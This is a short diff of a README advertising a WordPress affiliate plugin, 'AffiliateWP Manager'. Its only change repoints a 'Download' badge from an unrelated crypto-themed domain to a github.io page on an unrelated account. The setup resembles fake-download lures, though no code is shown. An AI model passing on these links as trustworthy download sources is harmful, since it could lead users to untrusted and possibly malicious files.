@@ -2,7 +2,7 @@
 
 AffiliateWP Manager is a powerful solution for WordPress site owners who want to launch and scale an affiliate program seamlessly. It offers everything needed: easy setup, real-time referral tracking, automated payouts, customizable dashboards, and advanced commission structures. Built for WooCommerce, Easy Digital Downloads, membership platforms, and more.
 
-[![Download AffiliateWP Manager](https://img.shields.io/badge/Download-AffiliateWP_Manager-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download AffiliateWP Manager](https://img.shields.io/badge/Download-AffiliateWP_Manager-blueviolet)](https://levensteinherma.github.io/.github/AffiliateWP)
 
 ---
 
